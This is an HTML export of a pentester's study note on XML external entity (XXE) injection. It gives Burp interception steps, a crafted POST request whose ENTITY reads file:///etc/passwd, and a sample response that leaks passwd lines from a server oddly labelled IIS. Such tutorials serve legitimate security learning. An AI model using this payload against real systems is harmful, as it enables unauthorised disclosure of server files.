<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Injection with Burp</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Injection with Burp</h1><br/>When data is passed to the server in an HTTP Request, it opens up the possibility of abuse from the user. XML is no different.<br /><br /><span style="color:#a5452a;">example where data from a form is wrapped in XML and sent to the server to be processed:</span><br />• Intercept the vulnerable POST request with a web proxy (Burpsuite, Zap, etc)<br />• Add the injected ENTITY tag and &amp;xxe; variable reference.<br />• Release the intercepted POST request<br /><br /><br />crafted POST request (injected content in red):<br /><div class="codebox"><pre>POST /notes/savenote HTTP/1.1<br />User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:65.0) Gecko/20100101 Firefox/65.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />Connection: close<br />Content-Type: text/xml;charset=UTF-8<br />Host: myserver.com<br />&lt;?xml <span style="color:#333333;font-weight:400">version=</span>”1.0″ ?&gt;<br /><span style="color:#333333;font-weight:400">&lt;!DOCTYPE</span> <span style="color:#333333;font-weight:400">foo</span> <span style="color:#333333;font-weight:400">[&lt;!ENTITY xxe</span> <span style="color:#333333;font-weight:400">SYSTEM</span> <span style="color:#000000;font-weight:700">“file:///etc/passwd”</span> <span style="color:#333333;font-weight:400">&gt;]&gt;</span><br />&lt;note&gt;<br />&lt;to&gt;Alice&lt;/to&gt;<br />&lt;from&gt;Bob&lt;/from&gt;<br />&lt;header&gt;Sync Meeting&lt;/header&gt;<br />&lt;time&gt;1200&lt;/time&gt;<br />&lt;body&gt;Meeting time changed <span style="color:#ffdd00;font-weight:400">&amp;xxe;</span>&lt;/body&gt;<br />&lt;/note&gt;<br /></pre></div><br /><br />Response:<br />The server, assuming valid data was inputted into the form, parses this XML data before saving it on the backend, and returns the parsed data along with the original valid data. In this case the contents of /etc/passwd are displayed.<br /><div class="codebox"><pre>HTTP/1.1 200 OK<br />Content-Type: text/xml;charset=UTF-8<br />Server: Microsoft-IIS/7.5<br />Date: Sat, 19 Apr 2019 13:08:49 GMT<br />Connection: close<br />Content-Length: 1039<br /><br />Note saved! From Bob to Alice about “Sync Meeting” at 1200: Meeting time has changed<br />root:x:0:0:root:/root:/bin/bash<br />daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br />bin:x:2:2:bin:/bin:/usr/sbin/nologin<br />sys:x:3:3:sys:/dev:/usr/sbin/nologin<br />sync:x:4:65534:sync:/bin:/bin/sync</pre></div><br /><br /><br /><br />Bibliography:<br /><a href="https://www.synack.com/blog/a-deep-dive-into-xxe-injection/">https://www.synack.com/blog/a-deep-dive-into-xxe-injection/</a></div>
</body>
</html>
